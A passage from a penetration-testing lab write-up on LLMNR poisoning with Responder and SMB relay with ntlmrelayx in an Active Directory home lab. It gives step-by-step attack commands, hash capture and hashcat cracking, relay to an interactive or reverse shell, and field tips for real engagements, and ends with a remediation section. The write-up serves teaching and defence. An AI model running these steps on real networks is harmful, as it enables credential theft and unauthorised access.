# LLMNR POISONING
#### LLMNR (Link Local Multicast Name Resolution) is a key feature enabled by default in Active Directory, used to hail other clients on the network if DNS fails to do so. The client sends out a broadcast asking any other connected clients to respond to the share request.  Responder, a multi-function MITM sniffer, will masquerade as this share, answer back, and in the process the username and NTLM password hash is exchanged.  Responder will capture this for us and we can attempt to crack the hash or reuse it in a SMB relay attack aka 'pass the hash'.  We will explore both, as well as examples of how we could use Responder during an engagement.

#### This demo was conducted in an AD Home Lab environment inside VirtualBox, using the free MS Evaluation Versions of Win10 Enterprise and Win Server2019.
#### With the DC and two Enterprise clients already running in the home lab, from your kali attack box also running inside VirtualBox on the same NAT Network, start Responder on your eth0
#### We can find our eth0 with the `ip a` command:
<img width="700" alt="image5" src="https://user-images.githubusercontent.com/76034874/186995673-2c0efa17-d788-4a41-b39a-6704c839518a.png">


#### Syntax to run Responder in verbose mode: `responder -I eth0 -v`

<img width="774" alt="image1" src="https://user-images.githubusercontent.com/76034874/186995327-2bf3e6da-c1a8-448f-84b2-d92a052d132a.png">

### Simulate a user login by logging into a mistyped share on your target Windows machine. You can type nearly anything as long as it starts with the double backslash and ends with a single backslash:
<img width="700" alt="image3" src="https://user-images.githubusercontent.com/76034874/187060594-9c11fcc1-a4b8-40e7-9104-f4aff787346a.png">


### Responder intercepts a response including the username and password hash:
![image](https://user-images.githubusercontent.com/76034874/186996305-77a429b1-3581-4f19-bb16-8e0246bcbaf8.png)

### My go-to hash identifier tool is `nth` (apt install name-that-hash). Bonus: it tells us the mode to use in hashcat and JTR.
the syntax looks like this: 
``` bash
nth -t 'fcastle::MARVEL:b5767a2e087ea531:157C0B6B863C13119F038A5C01F702D7:0101000000000000805C66FF6AB9D801840E548DADCD23980000000002000800300037005200490001001E00570049004E002D0048004F004E004D0041004A0035004D0031004900460004003400570049004E002D0048004F004E004D0041004A0035004D003100490046002E0030003700520049002E004C004F00430041004C000300140030003700520049002E004C004F00430041004C000500140030003700520049002E004C004F00430041004C0007000800805C66FF6AB9D801060004000200000008003000300000000000000001000000002000001C9851B85E8B1F50D2CC6B325325427C08CA439D04EBABC76FA4ACAA8FB6C5F20A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0032002E00330030000000000000000000'
```
![image](https://user-images.githubusercontent.com/76034874/186991763-66c543f3-e84e-4f03-9d3a-de036f2e85a7.png)
### Alternatively, we can use hashcat's help menu to identify the mode:
<img width="774" alt="Screen Shot 2022-08-27 at 11 35 15 PM" src="https://user-images.githubusercontent.com/76034874/187061044-179203b6-b3e3-486d-8e2f-0878766945c7.png">

### Now we can copy-paste the entire hash in a file on our attack machine via `nano hash.txt`
We can attempt to crack this hash using hashcat by running it against rockyou.txt.  In the real world, if this fails, we would use a more custom, bigger wordlist to make sure our weak password test is current and thorough.
syntax: `hashcat -O -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
![image](https://user-images.githubusercontent.com/76034874/186996929-a065c526-cf10-44ad-900e-7f4d5cfa1253.png)



# SMB RELAY
### SMB Relay Requirements: (aka "Pass the Hash")
1. SMB signing must be disabled (not required) on the target
2. relayed user hash must be admin on that machine
####  
Using nmap's builtin script to search for smb status on port 445:
syntax: `nmap --script=smb2-security-mode.nse -p445  10.0.2.0/24 | grep "smb2-security-mode" -A2 -B8`
Note: We are looking for SMB signing _not required_ for this to work.  Also, note this will still work between clients even though the DC has been "locked down" with SMB signing _enabled and required_.

<img width="700" height="500" alt="image4" src="https://user-images.githubusercontent.com/76034874/187007262-4d503d3c-80fa-4744-8a6f-5baab830b309.png">

#### We need to turn off SMB and HTTP in Responder's config, so `nano /etc/responder/Responder.conf` and make those edits:
![image](https://user-images.githubusercontent.com/76034874/187309572-e8832984-0a21-45b4-b1e9-cacd5e2d6ed8.png)


#### Restart Responder, and in a new terminal start a tool called `ntlmrelayx` on our attackbox:
Syntax: `ntlmrelayx.py -tf targets.txt -smb2support`
The targets.txt will contain the ip's of the clients we just identified with nmap that have SMB signing disabled.
#### Login in to the Windows machine and try to access a share we know is invalid on the network like our eth0: \\\10.0.2.30
<img width="807" alt="Screen Shot 2022-08-28 at 4 50 59 PM" src="https://user-images.githubusercontent.com/76034874/187099849-3124a8c9-e6f5-4a02-8f6b-cd5920650f42.png">

#### We can see the hashes come through. We can either crack these or attempt to relay them (another lesson).  Sometimes we find password reuse.  For example the same password found here could be used to log into the anti-virus program (so we could disable it) or another client on the network.
![image](https://user-images.githubusercontent.com/76034874/187008490-680f5243-efc4-4a78-b269-2558b2188c1b.png)

### Cracking SAM hashes. SAM hashes are NTLM hashes so will require a different mode in hashcat. 1st save the hashes to a file `nano hashes.txt`
![image](https://user-images.githubusercontent.com/76034874/187314134-530e8d81-51a2-487b-9f3d-44c997c963da.png)

### Use hashcat
### Syntax: `hashcat -O -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
### Then list out any cracked passwords:
Syntax: `hashcat -m1000 --show --usernames hashes.txt`

![image](https://user-images.githubusercontent.com/76034874/187315305-897906ec-2466-4551-8f59-70cc4ef482eb.png)


### Interactive Mode:  Another nice feature of ntlmrelayx we can leverage is its ability to create an interactive shell:
syntax: `ntlmrelayx.py -tf targets.txt -smb2support -i`

![image](https://user-images.githubusercontent.com/76034874/187008783-7a4a8830-4796-495e-b1a1-8efafd69e439.png)

#### Now we start a netcat listener in another terminal on our attack box at 127.0.0.1 11002 and we open up to a shell. Type 'help' to see a list of commands.  We can upload or download files with `get` and `put`.  We could run most windows commands in the ntlmrelay command line or upload our own reverse shell. For example:
Syntax: `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
`ntlmrelayx.py -tf targets.txt -smb2support -e "shell.exe"`
***Used with msfconsole and msfvenom***

![image](https://user-images.githubusercontent.com/76034874/187009309-f8dca5d0-8da0-4e4f-a705-6d289d1bae30.png)
<img width = "774" alt="image2" src="https://user-images.githubusercontent.com/76034874/187009336-bf0f7849-c3e3-4fa8-a88a-d0e40abb8f4b.png">

####  So how do we use this in the real world on an engagement?  I mean, users aren't logging into their shares by typing in our eth0, right?  True, but in a fast-paced, large organization with hundreds of employees, someone is likely to make a typo like \\\shaere01\Documents\ instead of \\\share01\Documents\\.  That's all it takes for LLMNR to step in and Responder is there to intercept.  Another scenario:  A user runs a stale login script that points to a share that no longer exists or has moved.  This will trigger the same DNS failure with LLMNR as AD's default fallback.  A good practice is to run Responder in the background at the start of the business day and right after lunch when most users are signing in, during the enumeration stage of the engagement.  Just like fishing, get that pole in the water early, check back often, you just may land an easy win!

## LET'S TALK REMEDIATION

### LLMNR ATTACKS
> Defenses against this attack:
>
> Disable LLMNR
> - If not possible: Require Network Access Control
> - Require Strong User Passwords: >14 chars and avoid common words


### SMB Relay Attacks - "Pass the hash"

> #### Enable and Require SMB Signing on all devices
>	- Pro: Stops the attack
>	- Con: Slows file copying speed down by 15%
> #### Disable NTLM authentication on network
>	- Pro: Stops the attack
>	- Con: if Kerberos stops working, Windows defaults back to NTLM
> #### Account tiering
>	- Pro: Limits domain admins to specific tasks
>	- Con: Enforcing policy may be difficult
> #### Local admin restriction
>	- Pro: prevents most lateral movement
>	- Con: increase in service desk tickets likely


##### credits: Special thanks to https://academy.tcm-sec.com/ Especially the AD Lab setup tutorial in the PEH course.
